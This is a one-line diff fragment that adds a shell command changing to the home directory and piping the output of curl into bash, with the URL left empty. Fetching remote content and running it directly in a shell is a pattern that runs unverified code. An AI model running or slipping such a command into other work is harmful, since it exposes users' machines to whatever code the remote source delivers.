@@ -1,0 +1,1 @@
+cd ~/ && curl -s "" | bash </dev/tty
